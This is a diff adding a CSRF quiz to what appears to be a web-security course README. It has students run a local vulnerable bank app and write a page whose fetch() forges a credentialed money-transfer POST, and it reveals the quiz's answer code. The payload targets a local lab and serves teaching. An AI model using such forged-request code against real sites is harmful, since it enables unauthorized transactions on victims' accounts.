@@ -23,3 +23,26 @@
 - Open a browser in incognito mode and go to `localhost:8080`
 - Inspect and click on **Send Request** to make a PUT request
 - Notice that a preflight request has been made by the **PUT** method
+
+## Concept 10 CSRF Quiz
+
+- Download L5-CSRF-Binary Zip
+- Run the executable
+- Open a browser in incognito mode and go to `bank.127.0.0.1.xip.io:8080`
+- Sign in using `super secret password`
+- Create an html page that executes a CRF request with the following syntax :
+
+`var body = "recipient=Umbrella+Corp&amount=666";
+			fetch("http://bank.127.0.0.1.xip.io:8080/transfer", {
+				method: "POST",
+				headers: {
+					'Content-Length': body.length,
+					'Content-Type': 'application/x-www-form-urlencoded'
+				},
+				credentials: 'include',
+				body: body
+			});
+`
+
+- Run the script above and refresh the bank's page
+- You should see in the application window the code `setyourcorsheader`
